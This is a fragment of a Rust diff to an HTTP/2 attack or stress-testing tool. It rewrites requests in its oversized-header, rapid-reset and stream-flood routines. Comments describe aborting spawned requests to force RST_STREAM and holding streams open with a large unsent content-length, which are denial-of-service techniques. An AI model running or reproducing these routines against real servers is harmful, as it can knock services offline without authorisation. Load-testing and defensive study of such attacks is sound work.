@@ -236,8 +236,7 @@ async fn oversize_once(
     let driver = tokio::spawn(conn);
     let req = Request::builder()
         .method("GET")
-        .uri("/")
-        .header("host", sni)
+        .uri(format!("https://{sni}/"))
         .header("x-oversize", big_value)
         .body(Full::new(Bytes::new()))?;
     // Race the (likely 4xx) response against an immediate teardown: a very
@@ -316,8 +315,7 @@ pub async fn run_rapid_reset(
                     let mut s = sender.clone();
                     let req = Request::builder()
                         .method("GET")
-                        .uri("/")
-                        .header("host", &sni)
+                        .uri(format!("https://{sni}/"))
                         .body(Full::new(Bytes::new()));
                     let Ok(req) = req else { break };
                     // Spawn so hyper emits HEADERS, then abort → RST_STREAM.
@@ -398,8 +396,7 @@ pub async fn run_stream_flood(
                     let mut s = sender.clone();
                     let req = Request::builder()
                         .method("POST")
-                        .uri("/")
-                        .header("host", &sni)
+                        .uri(format!("https://{sni}/"))
                         // Large CL but we never send the body → stream stays open.
                         .header("content-length", "1000000")
                         .body(Full::new(Bytes::new()));
